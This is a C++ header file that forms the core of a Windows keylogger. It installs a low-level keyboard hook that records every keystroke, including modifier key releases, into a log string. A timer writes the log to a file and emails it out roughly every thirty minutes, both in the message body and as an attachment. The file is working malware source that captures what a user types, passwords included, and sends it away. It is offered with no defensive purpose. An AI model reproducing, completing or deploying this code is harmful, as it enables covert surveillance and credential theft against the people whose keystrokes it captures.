#ifndef KEYBHOOK_H_INCLUDED
#define KEYBHOOK_H_INCLUDED

#include <iostream>
#include <fstream>
#include "windows.h"
#include "keyconstants.h"
#include "timer.h"
#include "sendmail.h"


std::string keylog = "";

void TimerSendMail()
{

    if(keylog.empty())
    {
        return;
    }
    //if keylog is not empty, write it to a file
    std::string last_file = IO::WriteLog(keylog);


    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Hi :)\nThe File has been attached\n"
                           "Testing, enjoy\n" + keylog,
                            IO::GetOurPath(true) + last_file);
        keylog = "";
}


Timer MailTimer(TimerSendMail, 500 * 60, -1L);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode <0)
    {
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    //if a key is pressed
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += keys::keyconvert[kbs->vkCode];

        if(kbs->vkCode == VK_RETURN)
        {
            keylog += '\n';
        }
    }
   //if a key is released
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key= kbs->vkCode;
        if(key == VK_CONTROL
           || key == VK_LCONTROL
           || key == VK_RCONTROL
           || key == VK_SHIFT
           || key == VK_RSHIFT
           || key == VK_LSHIFT
           || key == VK_MENU
           || key == VK_LMENU
           || key == VK_RMENU
           || key == VK_CAPITAL
           || key == VK_NUMLOCK
           || key == VK_LWIN
           || key == VK_RWIN
           )
        {
           std::string KeyName = keys::keyconvert[kbs->vkCode];
           KeyName.insert(1, "/");
           keylog += KeyName;
        }
    }
    return CallNextHookEx(eHook, nCode, wparam, lparam);
}


bool InstallHook()
{
    MailTimer.Start();

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                             GetModuleHandle(NULL), 0);
    return eHook == NULL;
}

#endif // KEYBHOOK_H_INCLUDED
